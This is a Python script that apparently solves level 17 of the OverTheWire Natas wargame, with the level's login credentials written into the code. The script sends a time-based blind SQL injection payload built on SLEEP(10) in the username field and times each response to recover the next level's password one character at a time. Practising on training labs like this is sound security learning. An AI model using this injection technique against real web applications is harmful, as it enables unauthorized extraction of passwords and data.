import requests
from requests.auth import HTTPBasicAuth
import string
import logging
import time

logging.basicConfig(level=logging.INFO)
url = "http://natas17.natas.labs.overthewire.org/index.php"

def construct_query(username, password_index, password_char):
    modified_password_index = password_index + 1
    query_template = "{username}\" AND IF (BINARY SUBSTRING(password,  {password_index},  1) = \"{password_char}\", SLEEP(10), NULL)#"
    return query_template.format(username=username,  password_index=modified_password_index,  password_char=password_char)

def main():
    password_chars = string.ascii_letters + string.digits
    username = "natas18"
    level_username = "natas17"
    level_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
    
    password = ""
    
    for i in range(32):
        for char in password_chars:
            print("\b"*20,  end="")
            data = construct_query(username,  i,  char)
            logging.debug("Trying query: " + data)
            print("Trying " + char,  sep=" ",  end=" ",  flush=True)
            start=time.time()
            response = requests.post(url,  data={"username":data}, auth=HTTPBasicAuth(level_username,  level_password))
            end=time.time()
            logging.debug(response.text)
            if end-start > 9:
                logging.info("Found character: " + char)
                password += char
                logging.info("Current Password: " + password)
                logging.info("Current Index: " + str(i))
                break
                
    print("Password is: " +password)
if __name__ == "__main__":
    main()
